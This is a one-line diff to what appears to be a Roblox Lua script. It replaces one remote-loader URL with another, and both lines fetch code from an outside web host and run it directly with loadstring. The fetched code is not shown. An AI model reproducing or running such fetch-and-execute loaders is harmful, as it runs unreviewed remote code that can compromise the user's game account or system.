@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=7593865581419"))("7593865581419")
+loadstring(game:HttpGet("https://cypher-protector.vercel.app/api/load/cypher-dmvs"))()
